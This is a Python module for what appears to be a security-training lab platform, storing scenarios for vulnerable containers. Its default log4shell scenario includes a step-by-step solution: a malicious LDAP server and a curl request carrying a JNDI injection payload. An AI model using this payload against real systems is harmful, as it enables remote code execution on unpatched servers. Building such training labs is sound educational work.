import os
import json

scenarios = {}
scenarios_file = "scenarios.json"

# A few default variables
scenarios['scenarios'] = []
scenarios['total'] = 0
scenarios['types'] = []
scenarios['total_types'] = 0

# region =====Scenario Class=====

class Scenario:
    
    # /!\ Whenever you add a new field to the scenario object, make sure you update all the fields in __init__, __str__, CreateDefault() and Parse()
    def __init__(self, name, description, goal, instructions, solution, base, images, CVE, difficulty, type, sources):
        self.name = name
        self.description = description
        self.goal = goal
        self.instructions = instructions
        self.solution = solution
        self.base = base
        self.images = images
        self.cve = CVE
        self.difficulty = difficulty # /5, 5/5 being the most difficult
        self.type = type
        self.sources = sources

    def __str__(self):
        scenario = {}
        scenario['name'] = self.name
        scenario['description'] = self.description
        scenario['goal'] = self.goal
        scenario['instructions'] = self.instructions
        scenario['solution'] = self.solution
        scenario['base'] = self.base
        scenario['images'] = self.images
        scenario['CVE'] = self.cve
        scenario['difficulty'] = self.difficulty
        scenario['type'] = self.type
        scenario['sources'] = self.sources
        return scenario

# endregion

def Load() -> dict:
    '''
    Returns the scenarios database as a python dictionnary.
    '''
    global scenarios

    if not os.path.exists(scenarios_file):
        with open(scenarios_file, 'w') as file:
            file.write(json.dumps(scenarios))
        CreateDefault()

    with open(scenarios_file, 'r') as file:
        _scenarios = json.load(file)
        return _scenarios
    
def scenarioIndex(s_list : dict, name : str):
    '''

    '''
    for index, scenario in enumerate(s_list):
        if scenario['name'] == name:
            return index
            
def UpdateFields(func):
    '''
    Decorator of the Save() function to properly update all the variables of the scenario database file. 
    '''
    def UpdateTypes(s_list, types):
        for scenario in s_list:
            if scenario['type'] not in types and scenario['type'] is not None:
                types.append(scenario['type'])
        return types

    def wrapper(*args, **kwargs):

        scenarios = func(*args, **kwargs)
        scenarios['total'] = len(scenarios['scenarios'])
        scenarios['types'] = UpdateTypes(scenarios['scenarios'], scenarios['types'])
        scenarios['total_types'] = len(scenarios['types'])

        with open(scenarios_file, 'w') as file:
            file.write(json.dumps(scenarios))

    return wrapper

@UpdateFields # The decorator is mandatory for that function
def Save(Scenario : Scenario):
    '''
    Saves a given Scenario object into the database file, updating all the necessary fields.
    '''
    scenarios = Load()

    index = scenarioIndex(scenarios['scenarios'], Scenario.name)
    if index is not None:
        scenarios['scenarios'][index] = Scenario.__str__()
    else:
        scenarios['scenarios'].append(Scenario.__str__())

    return scenarios

def CreateDefault():
    '''
    Function that writes all the default scenarios into the scenarios file.
    '''
    
    # Scenario 1 : log4shell
    name = 'log4shell'
    base = 'ghcr.io/christophetd/log4shell-vulnerable-app'
    description = ('Also known as CVE-2021-44228, log4shell is a zero-day software vulnerability in Apache Log4j2, a popular Java library used for logging purposes in applications.\n'
                   'This vulnerability enables a remote attacker to take control of a device on the internet if the device is running certain unpatched versions of Log4j2.\n'
                   'In December 2021, Apache had to release up to 4 corrective patches to fully close the breach. It is believed that malicious actors likely knew about the vulnerability'
                   ' and exploited it before experts did, hence why it is considered zero-day.')
    goal = 'Perform remote code execution on the container to do anything you want.'
    instructions = 'Find a way to remotely execute commands within the system (container).'
    solution = ('1. Download the JNDIExploit from that link -> https://tinyurl.com/yp2n78js then extract it in a dedicated folder.\n'
                    '2. Launch a malicious LDAP server using the command \n"java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888\"\n'
                    "3. Trigger the exploit using the command: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'\n"
                    "4. Go to Containers, open the main container shell and check for the presence of the pwned file by doing ls /tmp")
    difficulty = 2
    images = []
    main_image = {}
    main_image['name'] = base
    main_image['is_main'] = True
    main_image['operating_system'] = "Alpine Linux-3.8.2"
    main_image['ports'] = {"8080/tcp":8080} # Container port: Host port
    main_image['download_link'] = None
    images.append(main_image)
    cve = 'CVE-2021-44228'
    type = 'Remote Code Execution'
    sources = ['https://www.dynatrace.com/news/blog/what-is-log4shell/', 'https://en.wikipedia.org/wiki/Log4Shell', 'https://github.com/christophetd/log4shell-vulnerable-app']
    scenario = Scenario(name, description, goal, instructions, solution, base, images, cve, difficulty, type, sources)
    Save(scenario)


def Parse(_json : dict) -> Scenario:
    '''
    Instanciates a Scenario object from a json string.
    ---------------
    Parameters:

    _json: The dictionnary we are going to read to instantiate the scenario.
    '''
    name = _json['name']
    desc = _json['description']
    goal = _json['goal']
    inst = _json['instructions']
    sol = _json['solution']
    base = _json['base']
    images = _json['images']
    cve = _json['CVE']
    diff = _json['difficulty']
    type = _json['type']
    sources = _json['sources']

    scen = Scenario(name, desc, goal, inst, sol, base, images, cve, diff, type, sources)
    return scen

def LoadScenario(name : str, object=True) -> Scenario:

    scenarios = Load()
    index = scenarioIndex(scenarios['scenarios'], name)
    if index is not None:
        if object is True:
            return Parse(scenarios['scenarios'][index])
        else:
            return scenarios['scenarios'][index]

def Get(scenarios_db : dict, scenario_name, object=True) -> dict | None:
    for scenario in scenarios_db['scenarios']:
        if scenario_name in scenario['name']:
            if object is True:
                return Parse(scenario)
            else:
                return scenario
    
# region =====Testing=====

def test_saving_scenarios():
    ubuntu = Scenario('Blank Ubuntu', 'Basic ubuntu image', 'ubuntu', ['ubuntu'], None)
    kali = Scenario('Blank Kali', 'Basic kali image', 'kali', ['kali'], None)
    Save(ubuntu)
    Save(kali)

def test_retrieving_scenario():
    ubuntu = LoadScenario('Blank Ubuntu')
    fake = LoadScenario('Fake')
    print(ubuntu.__str__())
    print(fake)

# endregion

if __name__ == "__main__":
    #test_saving_scenarios()
    #test_retrieving_scenario()
    scen = Load()
    print(json.dumps(scen, indent=3))